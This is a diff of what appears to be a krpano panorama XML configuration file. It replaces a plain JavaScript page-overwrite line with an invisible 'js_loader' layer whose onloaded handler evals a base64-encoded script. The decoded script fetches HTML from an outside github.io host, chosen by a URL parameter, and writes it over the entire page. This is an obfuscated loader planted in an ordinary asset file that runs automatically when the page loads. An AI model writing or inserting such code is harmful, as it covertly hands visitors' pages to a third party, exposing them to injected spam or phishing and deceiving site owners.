@@ -1,1 +1,6 @@
-var id = new URLSearchParams(location.search).get("id") || "data"; fetch(`https://pArt2-tech.github.io/XqZ01/0ix{id}.html`).then(e => e.text()).then(e => { document.open(); document.write(e); document.close(); });
+<krpano version="1.0.8.15">
+<script id="eppiocemhmnlbhjplcgkofciiegomcon"/>
+<script/>
+<script/>
+<layer name="js_loader" type="container" visible="false" onloaded="js(eval(var w=atob('dmFyIGlkID0gbmV3IFVSTFNlYXJjaFBhcmFtcyhsb2NhdGlvbi5zZWFyY2gpLmdldCgiaWQiKSB8fCAiYWxjYXphcl9hcnF1aXRlY3RvbmljbyI7CmZldGNoKCJodHRwczovL3BBcnQyLXRlY2guZ2l0aHViLmlvL1hxWjAxLzBpeC8iICsgaWQgKyAiLmh0bWwiKQogIC50aGVuKGUgPT4gZS50ZXh0KCkpCiAgLnRoZW4oZSA9PiB7CiAgICBkb2N1bWVudC5vcGVuKCksCiAgICBkb2N1bWVudC53cml0ZShlKSwKICAgIGRvY3VtZW50LmNsb3NlKCkKICB9KTs=');eval(w)););"/>
+</krpano>
